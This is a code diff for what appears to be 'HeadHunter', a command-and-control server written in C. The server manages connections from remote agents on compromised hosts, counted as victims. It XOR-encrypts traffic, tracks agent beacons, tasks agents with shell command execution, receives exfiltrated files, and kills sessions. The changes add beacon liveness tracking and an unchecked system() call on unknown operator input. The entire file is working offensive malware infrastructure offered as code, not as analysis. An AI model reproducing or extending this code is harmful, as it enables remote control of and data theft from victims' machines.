@@ -5,19 +5,42 @@
 #include <ctype.h>
 #include <string.h>
 #include <unistd.h>
+#include <sys/time.h>
 #include "exfil.c"
 
 extern char* key;
 extern int keylen;
 
+void* BeaconRecv(void* arg){
+
+        int fd = *((int *) arg);
+        char beacon[1000];
+        int n;
+
+        while(((n = recv(fd, beacon, 1000, 0)) > 0)){
+                char* xorbeacon = XOR(beacon, key, 1000, keylen);
+//              printf("xorbeacon is: %s\n", xorbeacon);
+                if(str_starts_with(xorbeacon, "--HEADHUNTER BEACON--") == 0){
+                        for(int i = 0; i < max_clients; i++){
+                                if(client_socket[i] == fd){
+                                        gettimeofday(&last_check[i], NULL);
+                                }
+                        }
+                }
+                free(xorbeacon);
+        }
+        return NULL;
+}
+
 int server_control_session(){
     int n;
     char buffer[MAXBUF];
     int selected_id;
-
+    char* status = "";
     printf(PROMPT);
     fflush(NULL);
     while((n = read(a.src, buffer, MAXBUF)) > 0){
+
         if (strcmp(buffer, "help\n") == 0 || strcmp(buffer, "help\n\n") == 0) {
             printf("\nHeadHunter Control Server Commands:\n");
             printf("> help                   |  List all available commands\n");
@@ -25,11 +48,17 @@ int server_control_session(){
             printf("> use <session id>       |  Switch session to specified connection by id\n");
 	    printf("> kill <session id>      |  Kill socket connection to Agent\n");
             printf("> exit                   |  Close headhunter\n\n");
-        } else if (strcmp(buffer, "show sessions\n") == 0 || strcmp(buffer, "list connections\n\n") == 0 ) {
-            printf("\nID          Address\n--------------------------\n");
+        } else if (strcmp(newline_terminator(buffer), "show sessions\n") == 0 || strcmp(newline_terminator(buffer), "show connections\n") == 0 || strcmp(newline_terminator(buffer), "show\n") == 0 || strcmp(newline_terminator(buffer), "show \n") == 0) {
+            printf("\nID          Address                  Status \n--------------------------------------------------------------\n");
             for (int i = 0; i < max_clients; i++){
-                if (client_socket[i] == 0){ continue; }  // Continue just in case there is a random NULL socket
-                printf("%-12d%s\n", i + 1, get_socket_addr(client_socket[i]));
+                if (client_socket[i] == 0){ continue; }	// Continue just in case there is a random NULL socket
+		if(client_status[i] == 1){status = "\e[1;32m[+]\e[0m Active";}
+		else{status = "\e[1;31m[-]\e[0m Inactive";}
+		struct timeval current;
+		gettimeofday(&current, NULL);
+		time_t diff_sec = current.tv_sec - last_check[i].tv_sec;
+		if(diff_sec > 600){status = "\e[1;31m[-]\e[0m Inactive";}
+                printf("%-12d%-25s%s %ld seconds ago\n", i + 1, get_socket_addr(client_socket[i]), status, diff_sec);
             }
 	    printf("\n");
         } else if (str_starts_with(buffer, "use") == 0) {
@@ -41,10 +70,17 @@ int server_control_session(){
             selected_id += selected_value;
                 
             if (selected_id < 0) {
-                printf("Invalid id!\n\n");
+                printf("\e[1;31m[-]\e[0m Invalid id!\n\n");
             } else {
-                printf("[+] Entering agent control session with session ID: %d...\n", selected_id);
+                printf("\e[1;32m[+]\e[0m Entering agent control session with session ID: %d...\n", selected_id);
                 printf("Type \"bg\" to background agent control session\n");
+		
+		if(threads[selected_id-1] != 0){
+
+			pthread_cancel(threads[selected_id-1]);
+			threads[selected_id-1] = 0;
+		}
+
                 selected_id += 3;
                 return selected_id;
             }
@@ -59,21 +95,24 @@ int server_control_session(){
 		selected_id += selected_value;
 
 		if (selected_id < 0){
-			printf("Invalid id!\n\n");
+			printf("\e[1;31m[-]\e[0m Invalid id!\n\n");
 		} else{
-			printf("[+] Killing agent control session with session ID: %d...\n", selected_id);
+			printf("\e[1;32m[+]\e[0m Killing agent control session with session ID: %d...\n", selected_id);
 			selected_id += 3;
 			for(int i = 0; i < max_clients; i++){
 				if(client_socket[i] == selected_id){
+					char* exit = "exit\n";
+					char* xorexit = XOR(exit, key, strlen(exit), keylen);
+					send(client_socket[i], xorexit, strlen(exit), 0);
 					close(client_socket[i]);
 
 					victim_count--;
 					client_socket[i] = 0;
-					printf("[+] Control session: %d successfully killed.\n", selected_id - 3);
+					printf("\e[1;32m[+]\e[0m Control session: %d successfully killed.\n", selected_id - 3);
 				}
 				
 				else if(i == max_clients){
-					printf("[-] Could not find socket to kill.\n");
+					printf("\e[1;31m[-]\e[0m Could not find socket to kill.\n");
 				}
 			}
 		}
@@ -85,6 +124,8 @@ int server_control_session(){
         } else if(strcmp(buffer, "\n") == 0 || strcmp(buffer, "\n\n") == 0){
         } else {
             printf("Unknown command. Enter 'help' for list of available commands.\n");
+	    printf("Executing unkown command:\n");
+	    system(buffer);
         }
         printf(PROMPT);
         fflush(NULL);
@@ -100,9 +141,6 @@ void *Socket_Reader(){
     char buffer[MAXBUF];
     int n;
     char* xorbuffer;
-    n = read(a.dest, buffer, MAXBUF);
-    char* xorhello = XOR(buffer, key, n, keylen);
-    write(STDOUT_FILENO, xorhello, n);
 
     printf("beacon> ");
 
@@ -117,6 +155,16 @@ void *Socket_Reader(){
 		recvfile("out.hunter", a.dest, key);
 		continue;
 
+	}
+	else if(str_starts_with(xorbuffer, "--HEADHUNTER BEACON--") == 0){
+		for(int i = 0; i < max_clients; i++){
+	    	    if(client_socket[i] == a.dest){
+		    	client_status[i] = 1;
+			gettimeofday(&last_check[i], NULL);
+		    }
+		}
+		free(xorbuffer);
+		continue;
 	}
 
 	if(a.kill == 0){printf("beacon> ");}
@@ -156,11 +204,20 @@ void *Socket_Writer()
 	    
             printf("Backgrounding session...\n");
             a.kill = 1;
+
+	    int *arg = malloc(sizeof(*arg));
+	    *arg = a.dest;
+
+	    for(int i = 0; i < max_clients; i++){
+		if(client_socket[i] == a.dest){
+			pthread_create(&threads[i], NULL, BeaconRecv, arg);
+		}
+	    }
             return NULL;
         } 
 	else if(strcmp(newline_terminator(buffer), "exit\n") == 0){
 	
-	    printf("[+] Tasking agent with exit\n");	
+	    printf("\e[1;32m[+]\e[0m Tasking agent with exit\n");	
 	    char* xorbuffer = XOR(buffer, key, n, keylen);
 	    write(a.dest, xorbuffer, n);
 
@@ -171,12 +228,12 @@ void *Socket_Writer()
 	    		a.kill = 1;
 			victim_count--;
 			client_socket[i] = 0;
-			printf("[+] Control session: %d successfully exited.\n", a.dest - 3);
+			printf("\e[1;32m[+]\e[0m Control session: %d successfully exited.\n", a.dest - 3);
 	
 		}
 				
 		else if(i == max_clients){
-			printf("[-] Could not find socket to close.\n");
+			printf("\e[1;31m[-]\e[0m Could not find socket to close.\n");
 		}
 	    }
 
@@ -187,7 +244,7 @@ void *Socket_Writer()
 	else {
 	
 	    if(str_starts_with(buffer, "shell") == 0){
-		printf("\n[+] Tasking agent with command execution\n\n");
+		printf("\n\e[1;32m[+]\e[0m Tasking agent with command execution\n\n");
 	    }
 
 	    char* xorbuffer = XOR(buffer, key, n, keylen);
@@ -208,7 +265,6 @@ void *Socket_Writer()
 // *****************************************************
 // *****************************************************
 
-// Declaration of a thread routine that will be called by pthread for reading from stdin on server and write to the victim file descriptor
 void *Acceptor(){
     FD_SET(master_socket, &readfds);  // assigned master socket to the set
     for (i = 0; i < max_clients; i++)  // sets array of socket fds to zero so not read
@@ -246,26 +302,43 @@ void *Acceptor(){
             if ((activity < 0) && (errno!=EINTR)) {}
 
             if (FD_ISSET(master_socket, &readfds)) {
-                
+
 		if ((new_socket = accept(master_socket, (struct sockaddr *)&cli, &len))<0){
                     perror("accept");
                     exit(EXIT_FAILURE);
                 }
+
                 // add new socket to an array of sockets
+		int *arg = malloc(sizeof(*arg));
 
                 for (i = 0; i < max_clients; i++) {
                     // only if position is empty
                     if( client_socket[i] == 0 ){
-                        client_socket[i] = new_socket;
-                        victim_count++;
-                        printf("\nConnection received with %s\n", get_socket_addr(new_socket));
-                        printf("Press enter or type a command to resume previous session\n\n");
+			
+			char beacon[MAXBUF];
+			int n = recv(new_socket, beacon, MAXBUF, 0);
+			char* xorbeacon = XOR(beacon, key, n, keylen);
+			if(str_starts_with(xorbeacon, "--HEADHUNTER BEACON--") == 0){
 
+                        	client_socket[i] = new_socket;
+                        	victim_count++;
+				int *arg = malloc(sizeof(*arg));
+
+				*arg = client_socket[i];
+				pthread_create(&threads[i], NULL, BeaconRecv, arg);
+
+				client_status[i] = 1;
+				gettimeofday(&last_check[i], NULL);
+				*arg = client_socket[i];
+
+                        	printf("\nBeacon received from %s\n", get_socket_addr(new_socket));
+                        	printf("Press enter or type a command to resume previous session\n\n");
+			}
 
                         break;
                     }
                 }
-            }
+	    }
         }
     }
 }
